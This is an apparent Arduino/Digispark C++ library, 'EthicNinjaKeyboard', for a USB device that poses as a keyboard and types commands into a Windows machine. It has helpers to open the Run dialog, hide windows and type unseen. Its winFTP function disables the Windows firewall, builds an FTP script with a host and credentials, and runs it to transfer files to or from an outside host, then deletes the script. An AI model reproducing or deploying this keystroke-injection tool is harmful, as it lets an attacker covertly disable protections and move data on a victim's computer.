#include "DigiKeyboard.h"
#include "NinjaKeyboard.h"

void EthicNinjaKeyboard::init(int x)
{
	DigiKeyboard.update();
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(x);
	pinMode(1, OUTPUT);
	digitalWrite(1, HIGH);
}

void EthicNinjaKeyboard::pressAndRelease(byte x,byte y)
{  	
	DigiKeyboard.sendKeyStroke(x,y);	
}

void EthicNinjaKeyboard::done()
{
	for (int i=0; i<5; i++) {
    digitalWrite(1, HIGH);   // turn the LED on (HIGH is the voltage level)
    delay(100);               // wait for a second
    digitalWrite(1, LOW);    // turn the LED off by making the voltage LOW
    delay(100);
  }
}

void EthicNinjaKeyboard::pressAndRelease(byte x)
{  	
	DigiKeyboard.sendKeyStroke(x);	
}

void EthicNinjaKeyboard::press(byte x,byte y)
{  	
	DigiKeyboard.sendKeyPress(x,y);	
}

void EthicNinjaKeyboard::press(byte x)
{  	
	DigiKeyboard.sendKeyPress(x);	
}

void EthicNinjaKeyboard::release()
{  	
	DigiKeyboard.sendKeyPress(0,0);	
}

void EthicNinjaKeyboard::echo(char* x)
{  
	DigiKeyboard.print(x); 
}

void EthicNinjaKeyboard::echoEnter(char* x)
{  
	DigiKeyboard.print(x);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void EthicNinjaKeyboard::sleep(int x)
{	
	DigiKeyboard.delay(x);
}

void EthicNinjaKeyboard::winRUN(char* x)
{  
	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
	DigiKeyboard.delay(500);
	DigiKeyboard.println(x);
	DigiKeyboard.delay(500);
}

void EthicNinjaKeyboard::hideWindow()
{  
    DigiKeyboard.sendKeyStroke(KEY_RIGHT_ARROW,MOD_GUI_LEFT);  
    DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_R);
    DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_M);
    DigiKeyboard.sendKeyPress(KEY_RIGHT_ARROW);  
    DigiKeyboard.delay(3000);
    DigiKeyboard.sendKeyPress(0,0);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void EthicNinjaKeyboard::writeOnBackground(char* x)
{
	DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW,MOD_GUI_LEFT);
	DigiKeyboard.sendKeyStroke(KEY_ESCAPE,MOD_SHIFT_LEFT|MOD_ALT_LEFT);
	DigiKeyboard.print(x);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void EthicNinjaKeyboard::minimizeWindow()
{
	DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW,MOD_GUI_LEFT);
}

void EthicNinjaKeyboard::winFTP(char* action,char* username,char* password,char* host, char* port,char* file)
{  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);  
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(600);
  DigiKeyboard.println("cd %USERPROFILE%");  
  DigiKeyboard.println("@echo off");
  DigiKeyboard.println("del ftp.txt");
  DigiKeyboard.println("netsh firewall set opmode disable");
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("echo open ");
  DigiKeyboard.print(host);
  DigiKeyboard.print(" ");
  DigiKeyboard.print(port);
  DigiKeyboard.println(" > ftp.txt");
  
  DigiKeyboard.println("cls");
  
  DigiKeyboard.print("echo ");
  DigiKeyboard.print(username);
  DigiKeyboard.println(">> ftp.txt");
  
  DigiKeyboard.println("cls");
  
  DigiKeyboard.print("echo ");
  DigiKeyboard.print(password);
  DigiKeyboard.println(">> ftp.txt");
  	
  DigiKeyboard.println("cls");

  DigiKeyboard.println("echo bin >> ftp.txt");
  
  DigiKeyboard.print("echo ");
  DigiKeyboard.print(action);
  DigiKeyboard.print(" ");
  DigiKeyboard.print(file);
  DigiKeyboard.println(" >> ftp.txt");

  DigiKeyboard.println("cls");
  
  DigiKeyboard.println("echo bye >> ftp.txt");
  DigiKeyboard.println("cls");
  DigiKeyboard.println("ftp -s:ftp.txt");
  DigiKeyboard.println("del ftp.txt & exit");
}